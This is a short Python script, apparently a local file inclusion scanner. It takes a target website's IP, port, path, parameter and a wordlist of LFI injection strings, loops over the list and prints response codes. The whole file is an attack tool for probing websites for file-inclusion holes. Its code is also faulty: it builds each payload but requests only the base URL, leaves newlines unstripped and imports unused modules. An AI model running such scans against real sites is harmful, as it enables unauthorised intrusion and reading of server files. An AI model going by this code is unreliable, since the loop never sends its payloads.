from inspect import ArgSpec
from sqlite3 import adapt
from urllib import request
import httplib2
import argparse

# Init parser
parser = argparse.ArgumentParser()

# Add Args
parser.add_argument("-i", "--ip", help="The IP address of the website you are targeting", metavar="IP", dest="ip", type=str, required=True)
parser.add_argument("-p", "--port", help="The port the website is running on", metavar="PORT", dest="port", type=str, required=True)
parser.add_argument("-a", "--path", help="Full path", metavar="PATH", dest="path", type=str, required=True)
parser.add_argument("-P", "--parameter", help="The parameter to use", metavar="PARAM", dest="param", type=str, required=True)
parser.add_argument("-l", "--list", help="The full path to the list of potential LFI injections", metavar="LIST", dest="list", type=str, required=True)

# Final step
args = parser.parse_args()

# Define the website
website = "http://" + args.ip + ":" + args.port + "/" + args.path + args.param
http = httplib2.Http() # Init httplib2

# Open list and read all the lines
file = open(args.list, 'r')
lines = file.readlines()

# Read and loop through every line in file
for line in lines:
    payload = website + line
    resp = http.request(website)[0]
    print(resp.status)
